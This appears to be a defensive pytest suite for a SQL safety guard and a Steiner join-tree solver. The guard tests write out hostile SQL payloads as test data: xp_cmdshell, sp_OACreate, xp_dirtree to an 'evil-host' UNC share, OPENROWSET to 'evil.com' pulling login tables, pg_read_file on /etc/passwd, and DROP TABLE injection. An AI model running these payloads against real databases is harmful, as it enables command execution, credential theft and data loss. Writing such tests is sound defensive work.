"""Adversarial QA and Security Test Suite for Schema-Compass.

Target Components:
1. src/schema_compass/safety/ast_guard.py (AST validation, SQL mutation evasion, Cartesian detection, rewrite)
2. src/schema_compass/graph/steiner_solver.py (Steiner Minimal Join Tree solver, cyclic topologies, disconnected components)
"""

import pytest

from schema_compass.graph.schema_graph import SchemaGraph
from schema_compass.graph.steiner_solver import SteinerJoinSolver
from schema_compass.models import (
    DisconnectedGraphError,
    Relationship,
    TableContract,
)
from schema_compass.safety.ast_guard import ASTGuard, ASTSecurityViolation


@pytest.fixture
def guard() -> ASTGuard:
    return ASTGuard()


# ==============================================================================
# 1. SQL EVASION TECHNIQUES & PROHIBITED OPERATIONS (ast_guard.py)
# ==============================================================================


class TestSQLEvasionAndProhibitedOps:
    """Adversarial test vectors targeting AST evasion, mutations, procedures, and multi-statements."""

    def test_cte_hiding_delete_mutation(self, guard: ASTGuard) -> None:
        """Adversarial CTE hiding a DELETE mutation with RETURNING clause."""
        sql = "WITH deleted AS (DELETE FROM users WHERE status = 'pending' RETURNING *) SELECT * FROM deleted"
        with pytest.raises(ASTSecurityViolation, match="Prohibited node detected in AST: Delete"):
            guard.validate(sql, dialect="postgres")

    def test_cte_hiding_update_mutation(self, guard: ASTGuard) -> None:
        """Adversarial CTE hiding an UPDATE mutation with RETURNING clause."""
        sql = "WITH hacked AS (UPDATE accounts SET balance = balance + 1000 WHERE id = 1 RETURNING *) SELECT * FROM hacked"
        with pytest.raises(ASTSecurityViolation, match="Prohibited node detected in AST: Update"):
            guard.validate(sql, dialect="postgres")

    def test_cte_hiding_insert_mutation(self, guard: ASTGuard) -> None:
        """Adversarial CTE hiding an INSERT mutation with RETURNING clause."""
        sql = "WITH injected AS (INSERT INTO users (name, role) VALUES ('backdoor', 'admin') RETURNING id) SELECT * FROM injected"
        with pytest.raises(ASTSecurityViolation, match="Prohibited node detected in AST: Insert"):
            guard.validate(sql, dialect="postgres")

    def test_deeply_nested_subquery_mutation_in_where_exists(self, guard: ASTGuard) -> None:
        """Adversarial mutation nested deeply inside a WHERE EXISTS subquery."""
        sql = (
            "SELECT * FROM orders WHERE EXISTS ("
            "  WITH d AS (DELETE FROM audit_logs WHERE severity = 'HIGH' RETURNING 1) "
            "  SELECT 1 FROM d"
            ")"
        )
        with pytest.raises(ASTSecurityViolation, match="Prohibited node detected in AST: Delete"):
            guard.validate(sql, dialect="postgres")

    def test_subquery_mutation_inside_from_blocked(self, guard: ASTGuard) -> None:
        """Subquery in FROM clause attempting a DELETE mutation is blocked."""
        sql = "SELECT * FROM (DELETE FROM users RETURNING *) AS deleted_users"
        with pytest.raises(ASTSecurityViolation):
            guard.validate(sql, dialect="postgres")

    def test_output_into_clause_in_dml(self, guard: ASTGuard) -> None:
        """T-SQL OUTPUT INTO clause used to divert mutated data into another table."""
        sql = "DELETE FROM users OUTPUT DELETED.id, DELETED.name INTO user_audit"
        with pytest.raises(ASTSecurityViolation):
            guard.validate(sql, dialect="tsql")

    def test_select_into_temporary_table(self, guard: ASTGuard) -> None:
        """T-SQL SELECT INTO temporary table creation."""
        sql = "SELECT id, name INTO #temp_users FROM users"
        with pytest.raises(ASTSecurityViolation, match="Prohibited node detected in AST: Into"):
            guard.validate(sql, dialect="tsql")

    def test_multi_statement_with_inline_comment_hack(self, guard: ASTGuard) -> None:
        """Multi-statement injection disguised with comments across boundaries."""
        sql = "SELECT id FROM users WHERE id = 1; /* safe comment */ DROP TABLE users;"
        with pytest.raises(ASTSecurityViolation, match="Multi-statement execution blocked"):
            guard.validate(sql, dialect="tsql")

    def test_multi_statement_with_line_comments(self, guard: ASTGuard) -> None:
        """Multi-statement injection separated by line comments and newlines."""
        sql = "SELECT 1; -- innocuous comment\nDROP TABLE users;"
        with pytest.raises(ASTSecurityViolation, match="Multi-statement execution blocked"):
            guard.validate(sql, dialect="tsql")

    def test_multi_statement_batch_separator_evasion(self, guard: ASTGuard) -> None:
        """T-SQL batch separator 'GO' attempting to chain unauthorized statements."""
        sql = "SELECT 1\r\nGO\r\nDROP TABLE users"
        with pytest.raises(ASTSecurityViolation, match="SQL parse error"):
            guard.validate(sql, dialect="tsql")

    def test_empty_statement_semicolon_stuffing(self, guard: ASTGuard) -> None:
        """Consecutive semicolons filtered properly when no extra statement exists."""
        sql = ";;;SELECT id FROM users;;;"
        stmt = guard.validate(sql, dialect="tsql")
        assert stmt is not None

    def test_empty_sql_raises_violation(self, guard: ASTGuard) -> None:
        """Empty string or comment-only string raises security violation."""
        with pytest.raises(ASTSecurityViolation, match="Expected exactly 1 statement, found 0"):
            guard.validate("   -- just comment\n   ", dialect="tsql")

    def test_hex_literal_in_where_clause(self, guard: ASTGuard) -> None:
        """Hex-encoded string literal in WHERE clause accepted as valid read expression."""
        sql = "SELECT * FROM users WHERE username = 0x61646d696e"
        stmt = guard.validate(sql, dialect="tsql")
        assert stmt is not None

    # --- VULNERABILITY FINDINGS: Dangerous Procedures & Functions ---

    def test_vulnerability_xp_cmdshell_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows extended stored procedure xp_cmdshell in SELECT.

        Root cause: xp_cmdshell is parsed as exp.Anonymous rather than a prohibited DDL/DML node.
        An attacker can craft `SELECT xp_cmdshell('whoami')` and execute arbitrary OS commands.
        """
        sql = "SELECT xp_cmdshell('whoami')"
        with pytest.raises(ASTSecurityViolation, match="Prohibited function or procedure detected"):
            guard.validate(sql, dialect="tsql")

    def test_vulnerability_sp_oacreate_com_execution_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows OLE Automation procedure sp_OACreate in SELECT.

        Root cause: COM automation objects parsed as exp.Anonymous, bypassing PROHIBITED_NODES.
        """
        sql = "SELECT sp_OACreate('WScript.Shell', 1)"
        with pytest.raises(ASTSecurityViolation, match="Prohibited function or procedure detected"):
            guard.validate(sql, dialect="tsql")

    def test_vulnerability_xp_dirtree_ntlm_relay_bypass(self, guard: ASTGuard) -> None:
        r"""VULNERABILITY: ASTGuard allows xp_dirtree which can trigger NTLM hash leakage over SMB.

        Attackers invoke xp_dirtree on unc paths (e.g. \\attacker-ip\share) to capture NetNTLM hashes.
        """
        sql = "SELECT xp_dirtree('\\\\evil-host\\share', 1, 1)"
        with pytest.raises(ASTSecurityViolation, match="Prohibited function or procedure detected"):
            guard.validate(sql, dialect="tsql")

    def test_vulnerability_openrowset_out_of_band_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows OPENROWSET remote execution and OOB exfiltration.

        Root cause: OPENROWSET parses as exp.Anonymous inside exp.Table, completely bypassing
        PROHIBITED_NODES. Attackers can execute remote queries, read files, or extract credentials.
        """
        sql = "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil.com;UID=sa;PWD=p@ss', 'SELECT * FROM master.dbo.syslogins')"
        with pytest.raises(ASTSecurityViolation, match="Prohibited.*detected"):
            guard.validate(sql, dialect="tsql")

    def test_vulnerability_opendatasource_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows OPENDATASOURCE remote connection bypass."""
        sql = "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=evil.com').db.dbo.users"
        with pytest.raises(ASTSecurityViolation, match="Prohibited.*detected"):
            guard.validate(sql, dialect="tsql")

    def test_vulnerability_openquery_linked_server_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows OPENQUERY execution on linked servers."""
        sql = "SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version')"
        with pytest.raises(ASTSecurityViolation, match="Prohibited.*detected"):
            guard.validate(sql, dialect="tsql")

    def test_vulnerability_sqlite_load_extension_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows SQLite load_extension() for dynamic library loading."""
        sql = "SELECT load_extension('/tmp/malicious.so')"
        with pytest.raises(ASTSecurityViolation, match="Prohibited function or procedure detected"):
            guard.validate(sql, dialect="sqlite")

    def test_vulnerability_postgres_file_read_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: ASTGuard allows PostgreSQL administrative file-read functions."""
        sql = "SELECT pg_read_file('/etc/passwd')"
        with pytest.raises(ASTSecurityViolation, match="Prohibited function or procedure detected"):
            guard.validate(sql, dialect="postgres")

    def test_vulnerability_rewrite_negative_limit_bypass(self, guard: ASTGuard) -> None:
        """VULNERABILITY: Negative max_rows produces LIMIT -1 in PostgreSQL, disabling limits entirely."""
        sql = "SELECT id FROM users"
        rewritten = guard.rewrite(sql, dialect="postgres", max_rows=-1)
        assert "LIMIT 1" in rewritten
        assert "LIMIT -1" not in rewritten


# ==============================================================================
# 2. CARTESIAN JOIN EDGE CASES & BYPASSES (ast_guard.py)
# ==============================================================================


class TestCartesianJoinExploits:
    """Adversarial test vectors targeting Cartesian join detection logic."""

    def test_cartesian_join_properly_blocked_without_where(self, guard: ASTGuard) -> None:
        """Verify baseline protection: unconstrained CROSS JOIN without WHERE is blocked."""
        with pytest.raises(ASTSecurityViolation, match="Unconstrained Cartesian join detected"):
            guard.validate("SELECT * FROM orders CROSS JOIN customers")

    def test_implicit_comma_join_properly_blocked_without_where(self, guard: ASTGuard) -> None:
        """Verify baseline protection: implicit comma join without WHERE is blocked."""
        with pytest.raises(ASTSecurityViolation, match="Unconstrained Cartesian join detected"):
            guard.validate("SELECT * FROM orders, customers")

    def test_properly_constrained_joins_allowed(self, guard: ASTGuard) -> None:
        """Positive control: properly constrained joins specify ON or WHERE conditions."""
        guard.validate("SELECT * FROM orders JOIN customers ON orders.cust_id = customers.id")
        guard.validate("SELECT * FROM orders, customers WHERE orders.cust_id = customers.id")

    # --- REMEDIATED: Cartesian Join Validator Flaws Blocked ---

    def test_vulnerability_cross_join_bypassed_by_trivial_where(self, guard: ASTGuard) -> None:
        sql = "SELECT * FROM orders CROSS JOIN customers WHERE 1 = 1"
        with pytest.raises(ASTSecurityViolation, match="CROSS JOIN without condition blocked"):
            guard.validate(sql)

    def test_vulnerability_cross_join_bypassed_by_single_table_filter(
        self, guard: ASTGuard
    ) -> None:
        sql = "SELECT * FROM orders CROSS JOIN customers WHERE orders.id = 1"
        with pytest.raises(ASTSecurityViolation, match="CROSS JOIN without condition blocked"):
            guard.validate(sql)

    def test_vulnerability_implicit_join_multiple_unconstrained_tables(
        self, guard: ASTGuard
    ) -> None:
        sql = "SELECT * FROM a, b, c, d, e WHERE a.id = 1"
        with pytest.raises(ASTSecurityViolation, match="Unconstrained Cartesian join detected"):
            guard.validate(sql)

    def test_vulnerability_partial_join_implicit_cartesian_bypass(self, guard: ASTGuard) -> None:
        sql = "SELECT * FROM a, b, c WHERE a.id = b.id"
        with pytest.raises(ASTSecurityViolation, match="Unconstrained Cartesian join detected"):
            guard.validate(sql)

    def test_vulnerability_subqueries_in_from_cartesian_bypass(self, guard: ASTGuard) -> None:
        sql = "SELECT * FROM (SELECT * FROM a) AS s1, (SELECT * FROM b) AS s2 WHERE s1.id = 1"
        with pytest.raises(ASTSecurityViolation, match="Unconstrained Cartesian join detected"):
            guard.validate(sql)

    def test_vulnerability_inner_subquery_cross_join_with_where_bypass(
        self, guard: ASTGuard
    ) -> None:
        sql = "SELECT * FROM (SELECT * FROM a CROSS JOIN b WHERE 1 = 1) AS sub WHERE sub.id = 1"
        with pytest.raises(ASTSecurityViolation, match="CROSS JOIN without condition blocked"):
            guard.validate(sql)

    def test_vulnerability_cross_apply_unconstrained_bypass(self, guard: ASTGuard) -> None:
        sql = "SELECT * FROM orders CROSS APPLY (SELECT * FROM customers) AS c WHERE orders.id = 1"
        with pytest.raises(ASTSecurityViolation, match="Unconstrained Cartesian join detected"):
            guard.validate(sql, dialect="tsql")

    def test_defect_subquery_scope_leak_false_positive(self, guard: ASTGuard) -> None:
        """DEFECT / FALSE POSITIVE: Outer select without WHERE must NOT flag inner constrained joins."""
        sql = "SELECT * FROM (SELECT * FROM a, b WHERE a.id = b.id) AS sub"
        stmt = guard.validate(sql)
        assert stmt is not None


# ==============================================================================
# 3. STEINER SOLVER: DISCONNECTED COMPONENTS & ISOLATED CYCLIC GRAPHS (steiner_solver.py)
# ==============================================================================


class TestSteinerSolverGraphAdversarial:
    """Stress tests and boundary checks on Steiner Minimal Join Tree solver."""

    def test_isolated_cyclic_graph_shortest_path_selection(self) -> None:
        """Verify solver chooses minimum weight path around an isolated 5-node ring.

        Graph topology:
            r1 --(1.0)-- r2 --(1.0)-- r3 --(1.0)-- r4 --(1.0)-- r5 --(1.0)-- r1
        Terminals: r1, r4.
        Path 1: r1 - r2 - r3 - r4 (cost 3.0)
        Path 2: r1 - r5 - r4 (cost 2.0)
        Expected: Solver picks Path 2 with total_weight == 2.0.
        """
        sg = SchemaGraph()
        for i in range(1, 6):
            nxt = (i % 5) + 1
            sg.add_table(
                TableContract(
                    name=f"r{i}",
                    relationships=[
                        Relationship(
                            source_table=f"r{i}",
                            source_column=f"r{nxt}_id",
                            target_table=f"r{nxt}",
                            target_column="id",
                            weight=1.0,
                        )
                    ],
                )
            )

        solver = SteinerJoinSolver(sg)
        tree = solver.solve(["r1", "r4"])

        assert set(tree.tables_included) == {"r1", "r4", "r5"}
        assert tree.total_weight == 2.0
        assert len(tree.steps) == 2

    def test_isolated_cyclic_graph_all_nodes_terminal(self) -> None:
        """All nodes in a cycle specified as terminals; solver must break cycle into spanning tree."""
        sg = SchemaGraph()
        for i in range(1, 6):
            nxt = (i % 5) + 1
            sg.add_table(
                TableContract(
                    name=f"r{i}",
                    relationships=[
                        Relationship(
                            source_table=f"r{i}",
                            source_column=f"r{nxt}_id",
                            target_table=f"r{nxt}",
                            target_column="id",
                            weight=1.0,
                        )
                    ],
                )
            )

        solver = SteinerJoinSolver(sg)
        terminals = [f"r{i}" for i in range(1, 6)]
        tree = solver.solve(terminals)

        assert set(tree.tables_included) == set(terminals)
        assert len(tree.steps) == 4  # Spanning tree of 5 nodes has exactly 4 edges
        assert tree.total_weight == 4.0

    def test_multiple_disconnected_components_internal_and_cross_solve(self) -> None:
        """Schema with two disjoint cyclic components:
        Component A: Triangle (a1 - a2 - a3 - a1)
        Component B: Square (b1 - b2 - b3 - b4 - b1)
        """
        sg = SchemaGraph()
        # Component A
        for i in range(1, 4):
            nxt = (i % 3) + 1
            sg.add_table(
                TableContract(
                    name=f"a{i}",
                    relationships=[
                        Relationship(
                            source_table=f"a{i}",
                            source_column=f"a{nxt}_id",
                            target_table=f"a{nxt}",
                            target_column="id",
                            weight=1.0,
                        )
                    ],
                )
            )
        # Component B
        for i in range(1, 5):
            nxt = (i % 4) + 1
            sg.add_table(
                TableContract(
                    name=f"b{i}",
                    relationships=[
                        Relationship(
                            source_table=f"b{i}",
                            source_column=f"b{nxt}_id",
                            target_table=f"b{nxt}",
                            target_column="id",
                            weight=2.0,
                        )
                    ],
                )
            )

        solver = SteinerJoinSolver(sg)

        # 1. Solving purely inside Component A succeeds
        tree_a = solver.solve(["a1", "a3"])
        assert "a1" in tree_a.tables_included
        assert "a3" in tree_a.tables_included
        assert all(t.startswith("a") for t in tree_a.tables_included)

        # 2. Solving purely inside Component B succeeds
        tree_b = solver.solve(["b1", "b3"])
        assert "b1" in tree_b.tables_included
        assert "b3" in tree_b.tables_included
        assert all(t.startswith("b") for t in tree_b.tables_included)

        # 3. Solving across disjoint components raises DisconnectedGraphError
        with pytest.raises(DisconnectedGraphError, match="has no relational path to"):
            solver.solve(["a1", "b1"])

    def test_orphan_table_in_disconnected_graph(self) -> None:
        """Orphan table without edges in a graph with other connected clusters."""
        sg = SchemaGraph()
        sg.add_table(
            TableContract(
                name="users",
                relationships=[
                    Relationship(
                        source_table="users",
                        source_column="id",
                        target_table="orders",
                        target_column="user_id",
                    )
                ],
            )
        )
        sg.add_table(TableContract(name="orders", relationships=[]))
        sg.add_table(TableContract(name="orphan_metrics", relationships=[]))

        solver = SteinerJoinSolver(sg)

        # Connecting connected table to orphan raises error
        with pytest.raises(DisconnectedGraphError, match="has no relational path to"):
            solver.solve(["users", "orphan_metrics"])

        # Orphan table queried alone returns 0-step JoinTree
        orphan_tree = solver.solve(["orphan_metrics"])
        assert orphan_tree.root_table == "orphan_metrics"
        assert len(orphan_tree.steps) == 0
        assert orphan_tree.to_sql_from_clause() == "FROM orphan_metrics"

    def test_self_referential_foreign_key_cycle(self) -> None:
        """Self-referential foreign key creates a self-loop (e.g. employee manager hierarchy)."""
        sg = SchemaGraph()
        emp = TableContract(
            name="employees",
            relationships=[
                Relationship(
                    source_table="employees",
                    source_column="manager_id",
                    target_table="employees",
                    target_column="id",
                ),
                Relationship(
                    source_table="employees",
                    source_column="dept_id",
                    target_table="departments",
                    target_column="id",
                ),
            ],
        )
        dept = TableContract(name="departments", relationships=[])
        sg.load_tables([emp, dept])

        solver = SteinerJoinSolver(sg)
        tree = solver.solve(["employees", "departments"])
        assert tree.root_table == "employees"
        assert len(tree.steps) == 1
        assert tree.steps[0].to_table == "departments"

    def test_self_referential_self_join_limitation(self) -> None:
        """Self-join attempt (e.g. ['employees', 'employees']) is deduplicated and loses join step.

        Documenting architectural limitation: SteinerJoinSolver deduplicates unique terminals,
        so it cannot synthesize a self-join without table aliasing support.
        """
        sg = SchemaGraph()
        emp = TableContract(
            name="employees",
            relationships=[
                Relationship(
                    source_table="employees",
                    source_column="manager_id",
                    target_table="employees",
                    target_column="id",
                )
            ],
        )
        sg.load_tables([emp])

        solver = SteinerJoinSolver(sg)
        tree = solver.solve(["employees", "employees"])
        # Deduplication reduces terminals to 1, returning 0 join steps
        assert tree.root_table == "employees"
        assert len(tree.steps) == 0

    def test_empty_terminals_raises_value_error(self) -> None:
        """Empty terminals list raises ValueError."""
        sg = SchemaGraph()
        solver = SteinerJoinSolver(sg)
        with pytest.raises(ValueError, match="terminals list cannot be empty"):
            solver.solve([])

    def test_nonexistent_table_raises_disconnected_error(self) -> None:
        """Terminal table not present in graph raises DisconnectedGraphError."""
        sg = SchemaGraph()
        sg.add_table(TableContract(name="orders", relationships=[]))
        solver = SteinerJoinSolver(sg)
        with pytest.raises(DisconnectedGraphError, match="table 'ghost_table' not in schema graph"):
            solver.solve(["orders", "ghost_table"])

    def test_diamond_graph_cost_optimization(self) -> None:
        r"""Diamond topology where two paths exist; solver must select the cheaper path.

             A
           /   \
        (10)   (1)
         /       \
        B         C
         \       /
        (10)   (1)
           \   /
             D
        """
        sg = SchemaGraph()
        sg.add_table(
            TableContract(
                name="A",
                relationships=[
                    Relationship(
                        source_table="A",
                        source_column="b_id",
                        target_table="B",
                        target_column="id",
                        weight=10.0,
                    ),
                    Relationship(
                        source_table="A",
                        source_column="c_id",
                        target_table="C",
                        target_column="id",
                        weight=1.0,
                    ),
                ],
            )
        )
        sg.add_table(
            TableContract(
                name="B",
                relationships=[
                    Relationship(
                        source_table="B",
                        source_column="d_id",
                        target_table="D",
                        target_column="id",
                        weight=10.0,
                    ),
                ],
            )
        )
        sg.add_table(
            TableContract(
                name="C",
                relationships=[
                    Relationship(
                        source_table="C",
                        source_column="d_id",
                        target_table="D",
                        target_column="id",
                        weight=1.0,
                    ),
                ],
            )
        )
        sg.add_table(TableContract(name="D", relationships=[]))

        solver = SteinerJoinSolver(sg)
        tree = solver.solve(["A", "D"])

        assert set(tree.tables_included) == {"A", "C", "D"}
        assert "B" not in tree.tables_included
        assert tree.total_weight == 2.0

    def test_disconnected_root_table_fallback(self) -> None:
        """When an invalid or disconnected root_table is specified, solver falls back to optimal root."""
        sg = SchemaGraph()
        sg.add_table(
            TableContract(
                name="orders",
                role="fact",
                row_count=10000,
                relationships=[
                    Relationship(
                        source_table="orders",
                        source_column="cust_id",
                        target_table="customers",
                        target_column="id",
                    )
                ],
            )
        )
        sg.add_table(
            TableContract(name="customers", role="dimension", row_count=100, relationships=[])
        )
        sg.add_table(TableContract(name="isolated_node", relationships=[]))

        solver = SteinerJoinSolver(sg)
        # Requesting disconnected 'isolated_node' as root_table
        tree = solver.solve(["orders", "customers"], root_table="isolated_node")
        # Should gracefully fall back to the optimal root in the tree (orders)
        assert tree.root_table == "orders"
        assert len(tree.steps) == 1
